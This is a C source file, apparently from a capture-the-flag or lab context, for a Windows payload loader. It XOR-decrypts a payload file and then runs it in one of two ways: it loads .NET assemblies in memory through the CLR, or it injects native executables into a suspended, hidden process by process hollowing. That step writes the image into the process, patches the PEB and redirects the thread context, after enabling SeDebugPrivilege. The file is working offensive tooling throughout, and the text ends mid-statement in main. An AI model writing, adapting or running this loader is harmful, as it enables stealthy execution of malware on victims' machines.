#define _CRT_SECURE_NO_WARNINGS

#include <Windows.h>
#include <winternl.h>
#include <metahost.h>
#include <mscoree.h>
#include <oleauto.h>
#include <stdio.h>
#include <stddef.h>
#include <string.h>

#pragma comment(lib, "mscoree.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "advapi32.lib")

#define PRINT_WINAPI_ERR(API) \
    fprintf(stderr, "[!] %s Failed With Error: %lu\n", (API), GetLastError())

#define DELETE_HANDLE(H) do { \
    if ((H) != NULL && (H) != INVALID_HANDLE_VALUE) { \
        CloseHandle((H)); \
        (H) = NULL; \
    } \
} while (0)

// TARGET_PROCESS 제거 - 이제 argv[2]로 받음
#define PARMS   ""
#define XOR_KEY 0x55

BOOL EnableDebugPrivilege(VOID);
BOOL ReadFileFromDisk(IN LPCSTR cFileName, OUT PBYTE* ppBuffer, OUT PDWORD pdwFileSize);
VOID DecryptBuffer(IN OUT PBYTE pBuffer, IN DWORD dwSize);
BOOL IsManagedPE(IN const BYTE* pBuffer, IN DWORD dwSize);
BOOL RunManagedAssembly(IN const BYTE* pBuffer, IN DWORD dwSize);
BOOL CreateTheHollowedProcess(IN LPCSTR cRemoteProcessImage, IN OPTIONAL LPCSTR cProcessParms,
    OUT PPROCESS_INFORMATION pProcessInfo, OUT HANDLE* pStdInWrite, OUT HANDLE* pStdOutRead);
BOOL ReplaceBaseAddressImage(IN HANDLE hProcess, IN ULONG_PTR uPeBaseAddress, IN ULONG_PTR Rdx);
BOOL FixMemPermissionsEx(IN HANDLE hProcess, IN ULONG_PTR pPeBaseAddress,
    IN PIMAGE_NT_HEADERS pImgNtHdrs, IN PIMAGE_SECTION_HEADER pImgSecHdr);
VOID PrintOutput(IN HANDLE StdOutRead);
BOOL RemotePeExec(IN PBYTE pPeBuffer, IN LPCSTR cRemoteProcessImage, IN OPTIONAL LPCSTR cProcessParms);


/* ---------------------------------------------------------------
 * SeDebugPrivilege 활성화
 * --------------------------------------------------------------- */
BOOL EnableDebugPrivilege(VOID) {
    HANDLE          hToken = NULL;
    TOKEN_PRIVILEGES tp    = { 0 };
    BOOL            bState = FALSE;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        PRINT_WINAPI_ERR("OpenProcessToken");
        goto _CLEANUP;
    }

    if (!LookupPrivilegeValueA(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid)) {
        PRINT_WINAPI_ERR("LookupPrivilegeValue");
        goto _CLEANUP;
    }

    tp.PrivilegeCount           = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
        PRINT_WINAPI_ERR("AdjustTokenPrivileges");
        goto _CLEANUP;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        fprintf(stderr, "[!] SeDebugPrivilege not assigned - run as Administrator\n");
        goto _CLEANUP;
    }

    printf("[*] SeDebugPrivilege enabled\n");
    bState = TRUE;

_CLEANUP:
    DELETE_HANDLE(hToken);
    return bState;
}


/* ---------------------------------------------------------------
 * Read raw file into heap buffer
 * --------------------------------------------------------------- */
BOOL ReadFileFromDisk(IN LPCSTR cFileName, OUT PBYTE* ppBuffer, OUT PDWORD pdwFileSize) {
    HANDLE hFile               = INVALID_HANDLE_VALUE;
    PBYTE  pBuffer             = NULL;
    DWORD  dwFileSize          = 0;
    DWORD  dwNumberOfBytesRead = 0;

    if (!cFileName || !ppBuffer || !pdwFileSize)
        return FALSE;

    *ppBuffer    = NULL;
    *pdwFileSize = 0;

    hFile = CreateFileA(cFileName, GENERIC_READ, 0, NULL, OPEN_EXISTING,
                        FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        PRINT_WINAPI_ERR("CreateFileA");
        goto _CLEANUP;
    }

    dwFileSize = GetFileSize(hFile, NULL);
    if (dwFileSize == INVALID_FILE_SIZE || dwFileSize == 0) {
        PRINT_WINAPI_ERR("GetFileSize");
        goto _CLEANUP;
    }

    pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileSize);
    if (!pBuffer) {
        PRINT_WINAPI_ERR("HeapAlloc");
        goto _CLEANUP;
    }

    if (!ReadFile(hFile, pBuffer, dwFileSize, &dwNumberOfBytesRead, NULL) ||
        dwNumberOfBytesRead != dwFileSize) {
        PRINT_WINAPI_ERR("ReadFile");
        goto _CLEANUP;
    }

    *ppBuffer    = pBuffer;
    *pdwFileSize = dwFileSize;
    pBuffer      = NULL;

_CLEANUP:
    if (hFile != INVALID_HANDLE_VALUE)
        CloseHandle(hFile);
    if (pBuffer)
        HeapFree(GetProcessHeap(), 0, pBuffer);

    return (*ppBuffer != NULL && *pdwFileSize != 0);
}


/* ---------------------------------------------------------------
 * XOR 0x55 decrypt
 * --------------------------------------------------------------- */
VOID DecryptBuffer(IN OUT PBYTE pBuffer, IN DWORD dwSize) {
    for (DWORD i = 0; i < dwSize; i++) {
        pBuffer[i] ^= XOR_KEY;
    }
    printf("[*] XOR 0x%02X decryption complete (%lu bytes)\n", XOR_KEY, dwSize);
}


/* ---------------------------------------------------------------
 * PE32/PE32+ 공통 .NET(COM descriptor) 판별
 * --------------------------------------------------------------- */
BOOL IsManagedPE(IN const BYTE* pBuffer, IN DWORD dwSize) {
    if (!pBuffer || dwSize < sizeof(IMAGE_DOS_HEADER))
        return FALSE;

    const IMAGE_DOS_HEADER* dos = (const IMAGE_DOS_HEADER*)pBuffer;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE || dos->e_lfanew <= 0)
        return FALSE;

    SIZE_T ntOffset = (SIZE_T)dos->e_lfanew;
    SIZE_T minimum = sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) + sizeof(WORD);
    if (ntOffset > dwSize || minimum > (SIZE_T)dwSize - ntOffset)
        return FALSE;
    if (*(const DWORD*)(pBuffer + ntOffset) != IMAGE_NT_SIGNATURE)
        return FALSE;

    const IMAGE_NT_HEADERS32* nt32 =
        (const IMAGE_NT_HEADERS32*)(pBuffer + ntOffset);
    const IMAGE_DATA_DIRECTORY* clr = NULL;

    if (nt32->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC) {
        if (sizeof(IMAGE_NT_HEADERS32) > (SIZE_T)dwSize - ntOffset ||
            nt32->OptionalHeader.NumberOfRvaAndSizes <=
                IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR)
            return FALSE;
        clr = &nt32->OptionalHeader.DataDirectory[
            IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR];
    } else if (nt32->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
        if (sizeof(IMAGE_NT_HEADERS64) > (SIZE_T)dwSize - ntOffset)
            return FALSE;
        const IMAGE_NT_HEADERS64* nt64 =
            (const IMAGE_NT_HEADERS64*)(pBuffer + ntOffset);
        if (nt64->OptionalHeader.NumberOfRvaAndSizes <=
            IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR)
            return FALSE;
        clr = &nt64->OptionalHeader.DataDirectory[
            IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR];
    } else {
        return FALSE;
    }

    return clr->VirtualAddress != 0 &&
           clr->Size >= sizeof(IMAGE_COR20_HEADER);
}


/* ---------------------------------------------------------------
 * .NET Framework 4 in-memory CLR host
 * --------------------------------------------------------------- */
static const GUID IID_AppDomain_ = {
    0x05F696DC, 0x2B29, 0x3663,
    { 0xAD, 0x8B, 0xC4, 0x38, 0x9C, 0xF2, 0xA7, 0x13 }
};

typedef struct _CLR_HOST_STATE {
    ICLRMetaHost*     Meta;
    ICLRRuntimeInfo*  Info;
    ICorRuntimeHost*  Host;
    IUnknown*         DomainUnknown;
    IDispatch*        Domain;
    BOOL              ComInitialized;
    BOOL              RuntimeStarted;
} CLR_HOST_STATE;

static PVOID GetInterfaceMethod(IN PVOID pInterface, IN SIZE_T index) {
    return (*(PVOID**)pInterface)[index];
}

static VOID CloseCLRHost(IN OUT CLR_HOST_STATE* pState) {
    if (!pState)
        return;
    if (pState->Domain)
        pState->Domain->Release();
    if (pState->DomainUnknown)
        pState->DomainUnknown->Release();
    if (pState->RuntimeStarted && pState->Host)
        pState->Host->Stop();
    if (pState->Host)
        pState->Host->Release();
    if (pState->Info)
        pState->Info->Release();
    if (pState->Meta)
        pState->Meta->Release();
    if (pState->ComInitialized)
        CoUninitialize();
    ZeroMemory(pState, sizeof(*pState));
}

static HRESULT OpenCLRHost(OUT CLR_HOST_STATE* pState) {
    BOOL loadable = FALSE;
    HRESULT hr;

    if (!pState)
        return E_POINTER;
    ZeroMemory(pState, sizeof(*pState));

    hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (SUCCEEDED(hr))
        pState->ComInitialized = TRUE;
    else if (hr != RPC_E_CHANGED_MODE)
        return hr;

    hr = CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost,
                           (LPVOID*)&pState->Meta);
    if (FAILED(hr))
        return hr;

    hr = pState->Meta->GetRuntime(L"v4.0.30319", IID_ICLRRuntimeInfo,
                                  (LPVOID*)&pState->Info);
    if (FAILED(hr))
        return hr;

    hr = pState->Info->IsLoadable(&loadable);
    if (FAILED(hr) || !loadable)
        return FAILED(hr) ? hr : E_FAIL;

    hr = pState->Info->GetInterface(CLSID_CorRuntimeHost,
                                    IID_ICorRuntimeHost,
                                    (LPVOID*)&pState->Host);
    if (FAILED(hr))
        return hr;

    hr = pState->Host->Start();
    if (FAILED(hr))
        return hr;
    pState->RuntimeStarted = TRUE;

    hr = pState->Host->GetDefaultDomain(&pState->DomainUnknown);
    if (FAILED(hr))
        return hr;

    return pState->DomainUnknown->QueryInterface(
        IID_AppDomain_, (PVOID*)&pState->Domain);
}

static HRESULT LoadAssemblyBytes(
    IN IDispatch* pDomain,
    IN const BYTE* pBuffer,
    IN ULONG dwSize,
    OUT IDispatch** ppAssembly
) {
    typedef HRESULT(STDMETHODCALLTYPE* AppDomainLoad3)(
        PVOID, SAFEARRAY*, PVOID*);

    SAFEARRAY* bytes = NULL;
    BYTE* destination = NULL;
    HRESULT hr;

    if (!pDomain || !pBuffer || !dwSize || !ppAssembly)
        return E_INVALIDARG;
    *ppAssembly = NULL;

    bytes = SafeArrayCreateVector(VT_UI1, 0, dwSize);
    if (!bytes)
        return E_OUTOFMEMORY;

    hr = SafeArrayAccessData(bytes, (PVOID*)&destination);
    if (SUCCEEDED(hr)) {
        memcpy(destination, pBuffer, dwSize);
        SafeArrayUnaccessData(bytes);
        destination = NULL;

        // _AppDomain::Load_3(byte[]) = vtable slot 45.
        AppDomainLoad3 load3 =
            (AppDomainLoad3)GetInterfaceMethod(pDomain, 45);
        hr = load3(pDomain, bytes, (PVOID*)ppAssembly);
    }

    if (destination)
        SafeArrayUnaccessData(bytes);
    SafeArrayDestroy(bytes);
    return hr;
}

static HRESULT GetManagedEntryPoint(
    IN IDispatch* pAssembly,
    OUT IDispatch** ppMethod
) {
    typedef HRESULT(STDMETHODCALLTYPE* AssemblyGetEntryPoint)(
        PVOID, PVOID*);

    if (!pAssembly || !ppMethod)
        return E_INVALIDARG;
    *ppMethod = NULL;

    // _Assembly::get_EntryPoint = vtable slot 16.
    AssemblyGetEntryPoint getEntry =
        (AssemblyGetEntryPoint)GetInterfaceMethod(pAssembly, 16);
    return getEntry(pAssembly, (PVOID*)ppMethod);
}

static HRESULT CreateMainParameters(
    IN BOOL withStringArray,
    OUT SAFEARRAY** ppParameters
) {
    HRESULT hr;

    if (!ppParameters)
        return E_POINTER;
    *ppParameters = SafeArrayCreateVector(
        VT_VARIANT, 0, withStringArray ? 1 : 0);
    if (!*ppParameters)
        return E_OUTOFMEMORY;
    if (!withStringArray)
        return S_OK;

    SAFEARRAY* args = SafeArrayCreateVector(VT_BSTR, 0, 0);
    if (!args) {
        SafeArrayDestroy(*ppParameters);
        *ppParameters = NULL;
        return E_OUTOFMEMORY;
    }

    VARIANT argument;
    VariantInit(&argument);
    V_VT(&argument) = VT_ARRAY | VT_BSTR;
    V_ARRAY(&argument) = args;

    LONG index = 0;
    hr = SafeArrayPutElement(*ppParameters, &index, &argument);
    VariantClear(&argument);
    if (FAILED(hr)) {
        SafeArrayDestroy(*ppParameters);
        *ppParameters = NULL;
    }
    return hr;
}

static HRESULT InvokeManagedEntryPoint(
    IN IDispatch* pMethod,
    IN BOOL withStringArray,
    OUT LONG* pManagedResult
) {
    typedef HRESULT(STDMETHODCALLTYPE* MethodInvoke3)(
        PVOID, VARIANT, SAFEARRAY*, VARIANT*);

    SAFEARRAY* parameters = NULL;
    VARIANT target;
    VARIANT result;
    HRESULT hr;

    if (!pMethod || !pManagedResult)
        return E_INVALIDARG;
    *pManagedResult = 0;

    hr = CreateMainParameters(withStringArray, &parameters);
    if (FAILED(hr))
        return hr;

    VariantInit(&target);
    VariantInit(&result);
    V_VT(&target) = VT_NULL;

    // _MethodInfo::Invoke_3 = vtable slot 37.
    MethodInvoke3 invoke3 =
        (MethodInvoke3)GetInterfaceMethod(pMethod, 37);
    hr = invoke3(pMethod, target, parameters, &result);
    if (SUCCEEDED(hr)) {
        if (V_VT(&result) == VT_EMPTY || V_VT(&result) == VT_NULL) {
            *pManagedResult = 0;
        } else {
            VARIANT converted;
            VariantInit(&converted);
            hr = VariantChangeType(&converted, &result, 0, VT_I4);
            if (SUCCEEDED(hr))
                *pManagedResult = V_I4(&converted);
            VariantClear(&converted);
        }
    }

    VariantClear(&result);
    SafeArrayDestroy(parameters);
    return hr;
}

BOOL RunManagedAssembly(IN const BYTE* pBuffer, IN DWORD dwSize) {
    CLR_HOST_STATE state = { 0 };
    IDispatch* assembly = NULL;
    IDispatch* entryPoint = NULL;
    LONG managedResult = 0;
    HRESULT hr;

    printf("[*] Managed PE detected - using CLR Assembly.Load(byte[])\n");
    printf("[*] Target process is not used for the managed path\n");

    hr = OpenCLRHost(&state);
    if (FAILED(hr)) {
        fprintf(stderr, "[-] CLR v4 initialization failed: 0x%08lX\n",
                (ULONG)hr);
        goto _CLEANUP;
    }
    printf("[+] CLR v4 started\n");

    hr = LoadAssemblyBytes(state.Domain, pBuffer, dwSize, &assembly);
    if (FAILED(hr)) {
        fprintf(stderr, "[-] Assembly.Load(byte[]) failed: 0x%08lX\n",
                (ULONG)hr);
        fprintf(stderr, "[-] Check .NET Framework version and x64/AnyCPU architecture\n");
        goto _CLEANUP;
    }

    hr = GetManagedEntryPoint(assembly, &entryPoint);
    if (FAILED(hr) || !entryPoint) {
        fprintf(stderr, "[-] Managed assembly has no entry point: 0x%08lX\n",
                (ULONG)hr);
        goto _CLEANUP;
    }

    fflush(stdout);
    hr = InvokeManagedEntryPoint(entryPoint, FALSE, &managedResult);
    if (hr == DISP_E_BADPARAMCOUNT)
        hr = InvokeManagedEntryPoint(entryPoint, TRUE, &managedResult);
    if (FAILED(hr)) {
        fprintf(stderr, "[-] Managed entry point failed: 0x%08lX\n",
                (ULONG)hr);
        goto _CLEANUP;
    }

    printf("[+] Managed entry point returned: %ld\n", managedResult);

_CLEANUP:
    if (entryPoint)
        entryPoint->Release();
    if (assembly)
        assembly->Release();
    CloseCLRHost(&state);
    return SUCCEEDED(hr);
}


/* ---------------------------------------------------------------
 * Create suspended hollowed process with pipe I/O
 * --------------------------------------------------------------- */
BOOL CreateTheHollowedProcess(IN LPCSTR cRemoteProcessImage, IN OPTIONAL LPCSTR cProcessParms,
    OUT PPROCESS_INFORMATION pProcessInfo, OUT HANDLE* pStdInWrite, OUT HANDLE* pStdOutRead) {

    STARTUPINFOA        StartupInfo        = { 0 };
    SECURITY_ATTRIBUTES SecAttr            = { 0 };
    HANDLE              StdInRead          = NULL;
    HANDLE              StdInWrite         = NULL;
    HANDLE              StdOutRead         = NULL;
    HANDLE              StdOutWrite        = NULL;
    LPSTR               cRemoteProcessCmnd = NULL;
    SIZE_T              cbCommand          = 0;
    BOOL                bSTATE             = FALSE;

    if (!cRemoteProcessImage || !pProcessInfo || !pStdInWrite || !pStdOutRead)
        return FALSE;

    ZeroMemory(pProcessInfo, sizeof(*pProcessInfo));
    *pStdInWrite = NULL;
    *pStdOutRead = NULL;

    SecAttr.nLength              = sizeof(SecAttr);
    SecAttr.bInheritHandle       = TRUE;
    SecAttr.lpSecurityDescriptor = NULL;

    if (!CreatePipe(&StdInRead, &StdInWrite, &SecAttr, 0)) {
        PRINT_WINAPI_ERR("CreatePipe[stdin]");
        goto _CLEANUP;
    }
    if (!CreatePipe(&StdOutRead, &StdOutWrite, &SecAttr, 0)) {
        PRINT_WINAPI_ERR("CreatePipe[stdout]");
        goto _CLEANUP;
    }

    StartupInfo.cb          = sizeof(StartupInfo);
    StartupInfo.dwFlags     = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    StartupInfo.wShowWindow = SW_HIDE;
    StartupInfo.hStdInput   = StdInRead;
    StartupInfo.hStdOutput  = StdOutWrite;
    StartupInfo.hStdError   = StdOutWrite;

    cbCommand = strlen(cRemoteProcessImage) +
        (cProcessParms && *cProcessParms ? strlen(cProcessParms) + 1 : 0) + 1;

    cRemoteProcessCmnd = (LPSTR)LocalAlloc(LPTR, cbCommand);
    if (!cRemoteProcessCmnd) {
        PRINT_WINAPI_ERR("LocalAlloc");
        goto _CLEANUP;
    }

    if (cProcessParms && *cProcessParms)
        sprintf_s(cRemoteProcessCmnd, cbCommand, "%s %s", cRemoteProcessImage, cProcessParms);
    else
        sprintf_s(cRemoteProcessCmnd, cbCommand, "%s", cRemoteProcessImage);

    printf("[*] Spawning: %s\n", cRemoteProcessCmnd);

    if (!CreateProcessA(NULL, cRemoteProcessCmnd, NULL, NULL, TRUE,
                        CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
                        NULL, NULL, &StartupInfo, pProcessInfo)) {
        PRINT_WINAPI_ERR("CreateProcessA");
        goto _CLEANUP;
    }

    printf("[*] Target PID: %lu\n", pProcessInfo->dwProcessId);

    *pStdInWrite = StdInWrite;  StdInWrite = NULL;
    *pStdOutRead = StdOutRead;  StdOutRead = NULL;
    bSTATE = TRUE;

_CLEANUP:
    if (cRemoteProcessCmnd) LocalFree(cRemoteProcessCmnd);
    DELETE_HANDLE(StdInRead);
    DELETE_HANDLE(StdInWrite);
    DELETE_HANDLE(StdOutRead);
    DELETE_HANDLE(StdOutWrite);
    return bSTATE;
}


/* ---------------------------------------------------------------
 * Overwrite remote PEB ImageBaseAddress
 * --------------------------------------------------------------- */
BOOL ReplaceBaseAddressImage(IN HANDLE hProcess, IN ULONG_PTR uPeBaseAddress, IN ULONG_PTR Rdx) {
    ULONG_PTR uRemoteImageBaseOffset = Rdx + offsetof(PEB, Reserved3[1]);
    SIZE_T    NumberOfBytesWritten   = 0;

    if (!WriteProcessMemory(hProcess, (PVOID)uRemoteImageBaseOffset,
                            &uPeBaseAddress, sizeof(PVOID), &NumberOfBytesWritten) ||
        NumberOfBytesWritten != sizeof(PVOID)) {
        PRINT_WINAPI_ERR("WriteProcessMemory[PEB]");
        return FALSE;
    }
    printf("[*] PEB ImageBaseAddress patched: 0x%p\n", (PVOID)uPeBaseAddress);
    return TRUE;
}


/* ---------------------------------------------------------------
 * Apply correct section protections in remote process
 * --------------------------------------------------------------- */
BOOL FixMemPermissionsEx(IN HANDLE hProcess, IN ULONG_PTR pPeBaseAddress,
    IN PIMAGE_NT_HEADERS pImgNtHdrs, IN PIMAGE_SECTION_HEADER pImgSecHdr) {

    for (DWORD i = 0; i < pImgNtHdrs->FileHeader.NumberOfSections; i++) {
        DWORD dwProtection    = PAGE_NOACCESS;
        DWORD dwOldProtection = 0;
        DWORD characteristics = pImgSecHdr[i].Characteristics;

        if (!pImgSecHdr[i].SizeOfRawData || !pImgSecHdr[i].VirtualAddress)
            continue;

        if      ((characteristics & IMAGE_SCN_MEM_EXECUTE) &&
                 (characteristics & IMAGE_SCN_MEM_READ)    &&
                 (characteristics & IMAGE_SCN_MEM_WRITE))    dwProtection = PAGE_EXECUTE_READWRITE;
        else if ((characteristics & IMAGE_SCN_MEM_EXECUTE) &&
                 (characteristics & IMAGE_SCN_MEM_READ))     dwProtection = PAGE_EXECUTE_READ;
        else if ((characteristics & IMAGE_SCN_MEM_EXECUTE) &&
                 (characteristics & IMAGE_SCN_MEM_WRITE))    dwProtection = PAGE_EXECUTE_WRITECOPY;
        else if  (characteristics & IMAGE_SCN_MEM_EXECUTE)   dwProtection = PAGE_EXECUTE;
        else if ((characteristics & IMAGE_SCN_MEM_READ)    &&
                 (characteristics & IMAGE_SCN_MEM_WRITE))    dwProtection = PAGE_READWRITE;
        else if  (characteristics & IMAGE_SCN_MEM_READ)      dwProtection = PAGE_READONLY;
        else if  (characteristics & IMAGE_SCN_MEM_WRITE)     dwProtection = PAGE_WRITECOPY;

        if (!VirtualProtectEx(hProcess,
                              (PVOID)(pPeBaseAddress + pImgSecHdr[i].VirtualAddress),
                              pImgSecHdr[i].SizeOfRawData,
                              dwProtection, &dwOldProtection)) {
            PRINT_WINAPI_ERR("VirtualProtectEx");
            return FALSE;
        }
    }
    printf("[*] Section permissions applied\n");
    return TRUE;
}


/* ---------------------------------------------------------------
 * Drain stdout pipe from child process (non-blocking)
 * --------------------------------------------------------------- */
VOID PrintOutput(IN HANDLE StdOutRead) {
    for (;;) {
        DWORD dwAvailableBytes = 0;
        DWORD dwRead           = 0;
        PBYTE pBuffer          = NULL;

        if (!PeekNamedPipe(StdOutRead, NULL, 0, NULL, &dwAvailableBytes, NULL))
            break;
        if (dwAvailableBytes == 0)
            break;

        pBuffer = (PBYTE)LocalAlloc(LPTR, (SIZE_T)dwAvailableBytes + 1);
        if (!pBuffer) break;

        if (!ReadFile(StdOutRead, pBuffer, dwAvailableBytes, &dwRead, NULL)) {
            LocalFree(pBuffer);
            break;
        }

        fwrite(pBuffer, 1, dwRead, stdout);
        LocalFree(pBuffer);
    }
}


/* ---------------------------------------------------------------
 * Full process hollowing flow
 * --------------------------------------------------------------- */
BOOL RemotePeExec(IN PBYTE pPeBuffer, IN LPCSTR cRemoteProcessImage, IN OPTIONAL LPCSTR cProcessParms) {
    PROCESS_INFORMATION   ProcessInfo          = { 0 };
    CONTEXT               Context              = { 0 };
    HANDLE                StdInWrite           = NULL;
    HANDLE                StdOutRead           = NULL;
    PBYTE                 pRemoteAddress       = NULL;
    PIMAGE_NT_HEADERS     pImgNtHdrs           = NULL;
    PIMAGE_SECTION_HEADER pImgSecHdr           = NULL;
    SIZE_T                NumberOfBytesWritten = 0;
    BOOL                  bSTATE               = FALSE;

    if (!pPeBuffer || !cRemoteProcessImage)
        return FALSE;

    printf("[*] Entering RemotePeExec\n");

    Context.ContextFlags = CONTEXT_ALL;

    if (!CreateTheHollowedProcess(cRemoteProcessImage, cProcessParms,
                                  &ProcessInfo, &StdInWrite, &StdOutRead))
        goto _CLEANUP;

    printf("[*] Hollow process created\n");

    pImgNtHdrs = (PIMAGE_NT_HEADERS)(
        (ULONG_PTR)pPeBuffer + ((PIMAGE_DOS_HEADER)pPeBuffer)->e_lfanew);

    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE) {
        fprintf(stderr, "[!] Invalid NT Image Headers\n");
        goto _CLEANUP;
    }

    printf("[*] ImageBase: 0x%p  SizeOfImage: 0x%lX\n",
           (PVOID)(ULONG_PTR)pImgNtHdrs->OptionalHeader.ImageBase,
           pImgNtHdrs->OptionalHeader.SizeOfImage);

    pRemoteAddress = (PBYTE)VirtualAllocEx(
        ProcessInfo.hProcess,
        (LPVOID)(ULONG_PTR)pImgNtHdrs->OptionalHeader.ImageBase,
        (SIZE_T)pImgNtHdrs->OptionalHeader.SizeOfImage,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_READWRITE);

    if (!pRemoteAddress) {
        PRINT_WINAPI_ERR("VirtualAllocEx");
        goto _CLEANUP;
    }

    printf("[*] Remote alloc at: 0x%p\n", pRemoteAddress);

    if ((ULONG_PTR)pRemoteAddress != (ULONG_PTR)pImgNtHdrs->OptionalHeader.ImageBase) {
        fprintf(stderr, "[!] PE Payload Will Require Relocation - [NOT SUPPORTED]\n");
        fprintf(stderr, "[!] Wanted: 0x%p  Got: 0x%p\n",
                (PVOID)(ULONG_PTR)pImgNtHdrs->OptionalHeader.ImageBase,
                pRemoteAddress);
        goto _CLEANUP;
    }

    if (!WriteProcessMemory(ProcessInfo.hProcess, pRemoteAddress, pPeBuffer,
                            pImgNtHdrs->OptionalHeader.SizeOfHeaders,
                            &NumberOfBytesWritten) ||
        NumberOfBytesWritten != pImgNtHdrs->OptionalHeader.SizeOfHeaders) {
        PRINT_WINAPI_ERR("WriteProcessMemory[headers]");
        goto _CLEANUP;
    }

    printf("[*] PE headers written\n");

    pImgSecHdr = IMAGE_FIRST_SECTION(pImgNtHdrs);

    for (WORD i = 0; i < pImgNtHdrs->FileHeader.NumberOfSections; i++) {
        if (pImgSecHdr[i].SizeOfRawData == 0)
            continue;

        NumberOfBytesWritten = 0;
        if (!WriteProcessMemory(ProcessInfo.hProcess,
                                pRemoteAddress + pImgSecHdr[i].VirtualAddress,
                                pPeBuffer      + pImgSecHdr[i].PointerToRawData,
                                pImgSecHdr[i].SizeOfRawData,
                                &NumberOfBytesWritten) ||
            NumberOfBytesWritten != pImgSecHdr[i].SizeOfRawData) {
            PRINT_WINAPI_ERR("WriteProcessMemory[section]");
            goto _CLEANUP;
        }

        printf("[*] Section [%d] written: VA=0x%08lX  size=0x%lX\n",
               i, pImgSecHdr[i].VirtualAddress, pImgSecHdr[i].SizeOfRawData);
    }

    if (!GetThreadContext(ProcessInfo.hThread, &Context)) {
        PRINT_WINAPI_ERR("GetThreadContext");
        goto _CLEANUP;
    }

    printf("[*] Thread context: RCX=0x%llX  RDX=0x%llX\n", Context.Rcx, Context.Rdx);

    if (!ReplaceBaseAddressImage(ProcessInfo.hProcess,
                                 (ULONG_PTR)pRemoteAddress,
                                 (ULONG_PTR)Context.Rdx))
        goto _CLEANUP;

    Context.Rcx = (DWORD64)(
        (ULONG_PTR)pRemoteAddress +
        pImgNtHdrs->OptionalHeader.AddressOfEntryPoint);

    printf("[*] Entry point set: 0x%llX\n", Context.Rcx);

    if (!SetThreadContext(ProcessInfo.hThread, &Context)) {
        PRINT_WINAPI_ERR("SetThreadContext");
        goto _CLEANUP;
    }

    if (!FixMemPermissionsEx(ProcessInfo.hProcess,
                             (ULONG_PTR)pRemoteAddress,
                             pImgNtHdrs, pImgSecHdr))
        goto _CLEANUP;

    printf("[*] Resuming thread...\n");

    if (ResumeThread(ProcessInfo.hThread) == (DWORD)-1) {
        PRINT_WINAPI_ERR("ResumeThread");
        goto _CLEANUP;
    }

    // 데드락 방지: 폴링 방식으로 출력 수집 (500ms 간격, 최대 30초)
    printf("[*] Reading output...\n");
    {
        DWORD dwWait    = WAIT_TIMEOUT;
        DWORD dwTimeout = 30000;

        do {
            PrintOutput(StdOutRead);
            dwWait    = WaitForSingleObject(ProcessInfo.hProcess, 500);
            dwTimeout = (dwTimeout >= 500) ? dwTimeout - 500 : 0;
        } while (dwWait == WAIT_TIMEOUT && dwTimeout > 0);

        // 마지막 남은 출력 비우기
        PrintOutput(StdOutRead);

        if (dwWait == WAIT_TIMEOUT)
            printf("\n[!] Timeout - process still running or no output\n");
    }

    bSTATE = TRUE;

_CLEANUP:
    DELETE_HANDLE(StdInWrite);
    DELETE_HANDLE(StdOutRead);
    DELETE_HANDLE(ProcessInfo.hThread);
    DELETE_HANDLE(ProcessInfo.hProcess);
    return bSTATE;
}


/* ---------------------------------------------------------------
 * main - argv[1]: 페이로드 경로
 *        argv[2]: 네이티브 PE용 대상 프로세스 경로
 * --------------------------------------------------------------- */
int main(int argc, char* argv[]) {
    PBYTE  pBuffer        = NULL;
    DWORD  dwBufferSize   = 0;
    BOOL   bResult        = FALSE;
    LPCSTR pPayloadPath   = NULL;
    LPCSTR pTargetProcess = NULL;

    setvbuf(stdout, NULL, _IONBF, 0);

    if (argc < 2) {
        fprintf(stderr, "Usage:   %s <encrypted_payload> [target_process]\n", argv[0]);
        fprintf(stderr, "Native:  %s ctf.bin C:\\Windows\\System32\\notepad.exe\n", argv[0]);
        fprintf(stderr, "Managed: %s managed.bin\n", argv[0]);
        return -1;
    }

    pPayloadPath   = argv[1];
    pTargetProcess = (argc >= 3) ? argv[2] : NULL;

    printf("[*] Payload : %s\n", pPayloadPath);
    printf("[*] Target  : %s\n", pTargetProcess ? pTargetProcess : "(not supplied)");

    /* 1. 암호화된 페이로드 읽기 */
    if (!ReadFileFromDisk(pPayloadPath, &pBuffer, &dwBufferSize)) {
        fprintf(stderr, "[!] Failed to read payload: %s\n", pPayloadPath);
        return -1;
    }
    printf("[*] Payload read: %lu bytes\n", dwBufferSize);

    /* 2. XOR 0x55 복호화 */
    DecryptBuffer(pBuffer, dwBufferSize);

    /* 3. MZ 헤더 검증 */
    if (dwBufferSize < 2 || pBuffer[0] != 'M' || pBuffer[1] != 'Z') {
        fprintf(stderr, "[!] Decrypted buffer is not a valid PE (bad MZ)\n");
        HeapFree(GetProcessHeap(), 0, pBuffer);
        return -1;
    }
    printf("[*] MZ header verified\n");

    /* 4. 관리형/네이티브 실행 경로 분기 */
    if (IsManagedPE(pBuffer, dwBufferSize)) {
        bResult = RunManagedAssembly(pBuffer, dwBufferSize);
    } else {
        if (!pTargetProcess) {
            fprintf(stderr, "[-] Native PE requires a target_process argument\n");
            bResult = FALSE;
            goto _CLEANUP;
        }

        if (!EnableDebugPrivilege()) {
            fprintf(stderr,
